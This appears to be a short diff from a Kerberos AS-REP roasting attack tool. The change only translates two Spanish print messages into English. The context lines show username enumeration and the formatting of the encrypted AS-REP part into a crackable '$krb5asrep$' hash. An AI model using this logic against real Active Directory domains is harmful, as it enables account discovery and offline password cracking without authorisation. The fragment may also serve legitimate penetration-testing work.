@@ -83,7 +83,7 @@ class ASReqAttack:
             asRep = decoder.decode(response)[0]
             if asRep[1] == 11:
                 asRep = decoder.decode(response,asn1Spec=AS_REP())[0]
-                print(f"[+] Usuario {self.username} is valid y doesn't require preauth")
+                print(f"[+] User {self.username} is valid y doesn't require preauth")
                 formatted_string = '$krb5asrep$%s@%s:%s$%s' % (self.username, 
                                                     self.domain.upper(),
                                                     hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
@@ -97,7 +97,7 @@ class ASReqAttack:
                     print(f"[+] User {self.username} is valid")
         except KerberosError as e:
             if 'KDC_ERR_C_PRINCIPAL_UNKNOWN' in str(e):
-                print(f"[+] Usuario {self.username} is invalid")
+                print(f"[+] User {self.username} is invalid")
             else:
                 print(f"Kerberos error: {e}")
         except Exception as e:
